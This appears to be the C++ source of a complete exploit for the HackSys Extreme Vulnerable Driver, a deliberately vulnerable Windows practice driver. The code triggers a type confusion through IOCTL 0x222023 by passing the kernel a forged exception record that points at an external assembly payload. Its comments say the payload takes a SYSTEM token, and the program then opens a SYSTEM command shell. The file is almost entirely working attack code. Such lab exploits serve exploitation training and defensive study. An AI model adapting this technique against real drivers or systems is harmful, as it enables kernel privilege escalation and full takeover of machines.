#include <stdio.h>
#include <Windows.h>

// Reference the payload function so we can directory incorprotate masm to make our payload instead of using a shellcode char array
extern "C" void __stdcall payload(void);

// The two structures utilized in the vuln, the bottom one is the main one and references to top one
struct _EH3_EXCEPTION_REGISTRATION
{
	_EH3_EXCEPTION_REGISTRATION* Next;
	PVOID ExceptionHandler;
	DWORD ScopeTable;
	DWORD TryLevel;
};

struct CPPEH_RECORD
{
	DWORD old_esp;
	EXCEPTION_POINTERS* exc_ptr;
	_EH3_EXCEPTION_REGISTRATION registration;
};

int main()
{
	// IOCTL code for the Type Confusion path and some variables needed but not used
	int ioctl_code = 0x222023;
	char out[64];
	DWORD bytes_returned;

	printf("Starting Type Confusion Exploit\n");
	printf("Payload function address: 0x%x\n", payload);

	// Get a handle to HEVD
	HANDLE driver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (driver == INVALID_HANDLE_VALUE)
	{
		printf("[-] Error %d getting handle to driver\n", GetLastError());
		return 0;
	}

	printf("[+] Driver handle 0x%x\n", driver);

	// Create a instance of the necessary structure and set the exc_ptr member to our payload function so it gets executed by the driver
	// No DEP bypass needed since it uses an already executable segment of memory and no SMEP bypass since its on windows 7
	CPPEH_RECORD record;
	memset(&record, 0, sizeof(CPPEH_RECORD));
	record.exc_ptr = (EXCEPTION_POINTERS*) payload;

	printf("Press enter to send payload\n");
	getchar();

	printf("[*] Sending payload\n");

	// Send the driver request to run the payload
	if (!DeviceIoControl(driver, ioctl_code, &record, sizeof(CPPEH_RECORD), out, 64, &bytes_returned, 0))
	{
		printf("[-] Error %d sending ioctl code to driver\n", GetLastError());
		CloseHandle(driver);
		return 0;
	}

	printf("[+] Payload sent");
	CloseHandle(driver);
	
	printf("[*] Starting shell");

	// Function should have executed to give us a system token so launch cmd.exe and enjoy your system access!
	STARTUPINFOA startInfo;
	PROCESS_INFORMATION procInfo;
	
	memset(&startInfo, 0, sizeof(STARTUPINFOA));
	startInfo.cb = sizeof(STARTUPINFOA);
		
	if (!CreateProcessA(0, (LPSTR)"cmd.exe", 0, 0, 0, 0, 0, 0, &startInfo, &procInfo))
	{
		printf("[-] Error %d when launching cmd.exe\n", GetLastError());
	}
	else
	{
		WaitForSingleObject(procInfo.hProcess, INFINITE);
		CloseHandle(procInfo.hThread);
		CloseHandle(procInfo.hProcess);
	}

	return 0;
}